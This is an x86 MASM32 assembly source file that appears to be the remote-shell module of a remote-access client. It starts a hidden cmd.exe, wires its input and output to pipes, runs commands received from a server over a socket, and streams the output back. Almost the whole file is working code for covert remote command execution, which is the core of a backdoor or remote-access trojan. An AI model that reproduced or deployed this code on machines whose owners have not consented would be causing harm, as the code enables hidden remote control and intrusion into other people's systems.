.386
.model flat, stdcall
option casemap :none

__UNICODE__     equ     1

include shell.inc
include packet.inc
include network.inc
include mem_alloc.inc

include /masm32/include/kernel32.inc
include /masm32/include/user32.inc
include /masm32/include/masm32rt.inc

includelib /masm32/lib/kernel32.lib
includelib /masm32/lib/user32.lib
includelib /masm32/lib/wsock32.lib


TRY_PEEK_TIMES  equ     5
SLEEP_INTERVAL  equ     5   ; Seconds


InitPipe        proto
FreePipe        proto
PeekLoop        proto   remote: SOCKET
PeekPipe        proto   times: DWORD, got_size: ptr DWORD
SendPipeData    proto   remote: SOCKET, data_size: DWORD


.data
read_pipe           HANDLE      NULL
write_pipe          HANDLE      NULL
shell_read_pipe     HANDLE      NULL
shell_write_pipe    HANDLE      NULL
proc_info           PROCESS_INFORMATION     <?>


.code
StartupShell    proc    remote: SOCKET
    local   @startup_info: STARTUPINFO
    local   @shell_path[MAX_PATH]: TCHAR

    invoke  InitPipe
    .if     eax == FALSE
        ret
    .endif

    invoke  RtlZeroMemory, addr @startup_info, sizeof @startup_info
    mov     @startup_info.dwFlags, STARTF_USESTDHANDLES
    mov     @startup_info.cb, sizeof @startup_info
    mov     eax, shell_read_pipe
    mov     @startup_info.hStdInput, eax
    mov     eax, shell_write_pipe
    mov     @startup_info.hStdOutput, eax
    mov     @startup_info.hStdError, eax

    invoke  RtlZeroMemory, addr @shell_path, sizeof @shell_path
    invoke  GetSystemDirectory, addr @shell_path, MAX_PATH
    invoke  lstrcat, addr @shell_path, uc$("\cmd.exe")
    invoke  CreateProcess, addr @shell_path, NULL, NULL, NULL, TRUE,\
            CREATE_NO_WINDOW, NULL, NULL, addr @startup_info, addr proc_info
    .if     eax == FALSE
        print   "Failed to create the shell process.", 0Dh, 0Ah
        jmp     _Error
    .endif

    invoke  CreateThread, NULL, 0, offset PeekLoop, remote, 0, NULL
    .if     eax == NULL
        print   "Failed to create a thread to keep reading data from the shell.", 0Dh, 0Ah
        jmp     _Error
    .endif
    invoke  CloseHandle, eax

    mov     eax, TRUE
    ret

_Error:
    invoke  StopShell
    mov     eax, FALSE
    ret
StartupShell    endp


StopShell       proc
    .if proc_info.hProcess != NULL
        invoke  TerminateProcess, proc_info.hProcess, EXIT_SUCCESS
        invoke  CloseHandle, proc_info.hProcess
        mov     proc_info.hProcess, NULL
    .endif

    .if proc_info.hThread != NULL
        invoke  CloseHandle, proc_info.hThread
        mov     proc_info.hThread, NULL
    .endif

    invoke  FreePipe
    ret
StopShell       endp


OnShell         proc    remote: SOCKET, header: ptr Header, data: ptr BYTE
    local   @written: DWORD

    print   "The client has received a request to execute a shell command.", 0Dh, 0Ah

    mov     eax, proc_info.hProcess
    .if     eax == NULL
        print   "Failed to create the shell process.", 0Dh, 0Ah
        mov     eax, FALSE
        ret
    .endif

    mov     eax, header
    mov     ebx, data
    .if     eax == NULL ||  ebx == NULL
        print   "Failed to get the shell command.", 0Dh, 0Ah
        mov     eax, TRUE
        ret
    .endif

    mov     edx, dword ptr [eax + Header.data_size]
    invoke  WriteFile, write_pipe, ebx, edx, addr @written, NULL
    .if     eax == FALSE
        print   "Failed to send the command to the shell.", 0Dh, 0Ah
        mov     eax, FALSE
    .endif

    ret
OnShell         endp


InitPipe        proc
    local   @security_attr: SECURITY_ATTRIBUTES

    invoke  RtlZeroMemory, addr @security_attr, sizeof @security_attr
    mov     @security_attr.nLength, sizeof @security_attr
    mov     @security_attr.bInheritHandle, TRUE

    invoke  CreatePipe, addr read_pipe, addr shell_write_pipe, addr @security_attr, 0
    push    eax

    invoke  CreatePipe, addr shell_read_pipe, addr write_pipe, addr @security_attr, 0
    pop     ebx

    .if     eax == FALSE || ebx == FALSE
        print   "Failed to create shell pipes.", 0Dh, 0Ah
        jmp     _Error
    .endif

    mov     eax, TRUE
    ret

_Error:
    invoke  FreePipe
    mov     eax, FALSE
    ret
InitPipe        endp


FreePipe        proc
    .if read_pipe != NULL
        invoke  CloseHandle, read_pipe
        mov     read_pipe, NULL
    .endif
    .if write_pipe != NULL
        invoke  CloseHandle, write_pipe
        mov     write_pipe, NULL
    .endif

    .if shell_read_pipe != NULL
        invoke  CloseHandle, shell_read_pipe
        mov     shell_read_pipe, NULL
    .endif
    .if shell_write_pipe != NULL
        invoke  CloseHandle, shell_write_pipe
        mov     shell_write_pipe, NULL
    .endif

    ret
FreePipe        endp


PeekLoop        proc    remote: SOCKET
    local   @remain: DWORD

    .while  TRUE
        invoke  PeekPipe, TRY_PEEK_TIMES, addr @remain
        .if     eax == FALSE
            print   "Failed to peek at the shell.", 0Dh, 0Ah
            .if     @remain != 0
                invoke  SendPipeData, remote, @remain
            .endif
            .break
        .elseif @remain == 0
            invoke  Sleep, SLEEP_INTERVAL * 1000
            .continue
        .endif

        invoke  SendPipeData, remote, @remain
        invoke  Sleep, 0
    .endw

    ret
PeekLoop        endp


PeekPipe        proc    times: DWORD, got_size: ptr DWORD
    local   @remain: DWORD
    local   @total: DWORD

    mov     @remain, 0
    mov     @total, 0
    xor     ecx, ecx
    .while  ecx < times
        push    ecx
        ; BUG: Sometimes `PeekNamedPipe` cannot get data size from the pipe but it returns `true`.
        invoke  PeekNamedPipe, read_pipe, NULL, 0, NULL, addr @remain, NULL
        .if     eax == FALSE
            jmp     _Exit
        .elseif @remain != 0
            mov     eax, @total
            add     eax, @remain
            mov     @total, eax
        .endif

        invoke  Sleep, 1000
        pop     ecx
        inc     ecx
    .endw

    mov     eax, TRUE

_Exit:
    mov     ebx, got_size
    mov     edx, @total
    mov     dword ptr [ebx], edx
    ret
PeekPipe        endp


SendPipeData    proc    remote: SOCKET, data_size: DWORD
    local   @got: DWORD
    local   @buffer: ptr BYTE
    local   @header: Header

    .if     data_size == 0
        ret
    .endif

    mov     @buffer, NULL
    mov     ecx, data_size
    inc     ecx
    push    ecx
    invoke  AllocMemory, ecx
    mov     @buffer, eax
    pop     ecx
    invoke  RtlZeroMemory, @buffer, ecx
    invoke  ReadFile, read_pipe, @buffer, data_size, addr @got, NULL
    .if     eax == FALSE
        print   "Failed to read messages from the shell.", 0Dh, 0Ah
        jmp     _Exit
    .endif

    mov     @header.packet_type, SHELL
    mov     eax, @got
    inc     eax
    mov     @header.data_size, eax
    invoke  SendPacket, remote, addr @header, @buffer
    .if     eax == SOCKET_ERROR
        print   "Failed to send shell messages to the server.", 0Dh, 0Ah
        jmp     _Exit
    .endif

_Exit:
    invoke  FreeMemory, @buffer
    mov     @buffer, NULL
    ret
SendPipeData    endp

end